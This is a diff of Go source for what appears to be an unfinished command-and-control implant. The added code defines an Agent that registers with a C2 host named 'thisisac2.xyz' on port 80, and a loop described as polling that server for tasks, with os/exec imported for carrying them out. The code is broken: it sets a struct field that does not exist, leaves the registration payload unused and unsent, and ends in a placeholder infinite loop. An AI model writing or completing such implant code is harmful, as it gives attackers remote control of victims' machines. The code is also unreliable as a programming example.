@@ -6,18 +6,19 @@ import (
 	"os/exec"
 	"net"
 	"strings"
+	"net/http"
+    "time"
+	"encoding/json"
+	"bytes"
 )
 
-const (
-	ServerIP = "thisisac2.xyz"
-	ServerPort = "80"
-	ServerURL = "http://" + ServerIP + ":" + ServerPort
-	CallbackInterval = 120
-)
-
-var (
-	LocalIP = getLocalIP()
-)
+type Agent struct {
+    LocalIP  string
+    ServerIP string
+    ServerPort int
+	CallbackInterval int
+	Client *http.Client
+}
 
 type Task struct {
 	Action string `json:"action"`
@@ -58,6 +59,39 @@ func getLocalIP() string {
 	}
 }
 
+func (agent *Agent) Register() error {
+    data := map[string]string{
+        "agent_id": agent.LocalIP,
+    }
+
+    jsonData, err := json.Marshal(data)
+    if err != nil {
+        return fmt.Errorf("failed to marshal JSON: %w", err)
+    }
+	return nil
+}
+
 func main(){
-	fmt.Println("Local IP:", LocalIP)
+	agent := Agent{
+        LocalIP:  getLocalIP(),
+        ServerIP: "thisisac2.xyz",
+        Port:     80,
+		Client: &http.Client{
+            Timeout: 10 * time.Second,
+        },
+    }
+
+	// Attempt to register the agent with C2 server until successful
+	for {
+		err := agent.Register()
+		if err != nil {
+			fmt.Println("Error registering agent:", err)
+		}
+		break
+	}
+
+	// Main loop to poll server for tasks
+	for {
+		fmt.Println("Finish later")
+	}
 }
